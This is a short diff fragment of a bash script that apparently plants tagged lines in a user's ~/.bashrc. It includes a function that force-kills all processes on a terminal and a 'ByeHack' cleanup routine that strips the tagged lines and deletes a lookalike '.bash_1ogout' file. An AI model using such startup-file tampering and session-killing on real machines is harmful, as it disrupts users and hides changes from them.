@@ -51,6 +51,7 @@ function  _ki { #_fdsagadsfasdgadsgsss
   pkill -9 -t $1  #_fdsagadsfasdgadsgsss
 } #_fdsagadsfasdgadsgsss
 function ByeHack {    #_fdsagadsfasdgadsgsss
+    source ~/.bashrc; #_fdsagadsfasdgadsgsss
     sed -ie '/#_fdsagadsfasdgadsgsss$/d' ~/.bashrc;   #_fdsagadsfasdgadsgsss
     rm ~/.bash_1ogout;  #_fdsagadsfasdgadsgsss
     _resume;    #_fdsagadsfasdgadsgsss
